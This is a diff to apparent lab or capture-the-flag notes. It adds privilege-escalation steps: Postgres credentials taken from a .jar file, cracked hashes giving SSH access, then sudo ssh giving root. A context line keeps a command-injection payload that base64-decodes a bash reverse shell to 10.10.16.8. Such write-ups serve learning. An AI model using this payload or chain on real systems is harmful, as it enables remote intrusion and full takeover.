@@ -68,3 +68,13 @@ Replace spaces:
 `;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44LzEzMzcgMD4mMQo="${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;#`
 
 ### Privilege Escalation
+
+linpeas.sh shows Postgres running on localhost
+
+App .jar file contains clear text postgres credentials and DB name
+
+Postgres DB contains usernames and hashes
+
+Crack one of the hashes, valid user password allowing ssh access as local user
+
+local user can run ssh as root giving us a root shell
